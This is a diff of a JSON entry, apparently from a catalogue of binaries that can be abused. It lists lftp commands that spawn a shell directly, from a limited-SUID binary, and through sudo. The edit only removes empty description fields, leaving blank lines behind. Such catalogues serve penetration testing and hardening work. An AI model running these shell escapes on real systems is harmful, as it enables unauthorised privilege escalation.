@@ -2,19 +2,19 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "lftp -c '!/bin/sh'\n"
       }
     ],
     "limited-suid": [
       {
-        "description": "",
+        
         "code": "./lftp -c '!/bin/sh'\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo lftp -c '!/bin/sh'\n"
       }
     ]
